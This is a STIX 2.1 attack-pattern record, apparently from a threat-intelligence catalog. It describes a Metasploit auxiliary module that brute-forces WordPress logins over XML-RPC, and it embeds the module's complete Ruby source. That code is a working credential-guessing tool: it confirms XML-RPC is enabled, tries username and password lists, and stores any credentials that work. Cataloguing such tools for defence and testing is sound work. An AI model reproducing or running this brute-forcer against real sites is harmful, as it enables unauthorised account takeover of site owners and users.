{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fc70823b-1c40-4c4c-bbe9-8a9aae1f54a2",
    "created": "2024-08-14T16:29:40.319725Z",
    "modified": "2024-08-14T16:29:40.319729Z",
    "name": "Wordpress XML-RPC Username/Password Login Scanner",
    "description": " This module attempts to authenticate against a Wordpress-site (via XMLRPC) using username and password combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options. '",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wordpress_xmlrpc_login.rb",
            "external_id": "wordpress_xmlrpc_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://wordpress.org/"
        },
        {
            "source_name": "reference",
            "url": "http://www.ethicalhack3r.co.uk/security/introduction-to-the-wordpress-xml-rpc-api/"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/wordpress_rpc'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n     'Name'         => 'Wordpress XML-RPC Username/Password Login Scanner',\n     'Description'  => '\n       This module attempts to authenticate against a Wordpress-site\n       (via XMLRPC) using username and password combinations indicated\n       by the USER_FILE, PASS_FILE, and USERPASS_FILE options.\n      ',\n     'Author'      =>\n       [\n         'Cenk Kalpakoglu <cenk.kalpakoglu[at]gmail.com>',\n       ],\n     'License'     => MSF_LICENSE,\n     'References'  =>\n       [\n         ['URL', 'https://wordpress.org/'],\n         ['URL', 'http://www.ethicalhack3r.co.uk/security/introduction-to-the-wordpress-xml-rpc-api/'],\n         ['CVE', '1999-0502'] # Weak password\n       ]\n      ))\n\n    register_options(\n        [\n          Opt::RPORT(80),\n        ])\n\n    deregister_options('BLANK_PASSWORDS', 'PASSWORD_SPRAY') # we don't need these options\n  end\n\n  def run_host(ip)\n    print_status(\"#{peer}:#{wordpress_url_xmlrpc} - Sending Hello...\")\n    if wordpress_xmlrpc_enabled?\n      vprint_good(\"XMLRPC enabled, Hello message received!\")\n    else\n      print_error(\"XMLRPC is not enabled! Aborting\")\n      return :abort\n    end\n\n    print_status(\"Starting XML-RPC login sweep...\")\n\n    cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::WordpressRPC.new(\n      configure_http_login_scanner(\n        uri: wordpress_url_xmlrpc,\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5,\n        http_username: datastore['HttpUsername'],\n        http_password: datastore['HttpPassword']\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      case result.status\n        when Metasploit::Model::Login::Status::SUCCESSFUL\n          print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n          credential_core = create_credential(credential_data)\n          credential_data[:core] = credential_core\n          create_credential_login(credential_data)\n          :next_user\n        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => \"Could not connect\"\n          end\n          invalidate_login(credential_data)\n          :abort\n        when Metasploit::Model::Login::Status::INCORRECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n          end\n          invalidate_login(credential_data)\n      end\n    end\n\n  end\nend\n"
}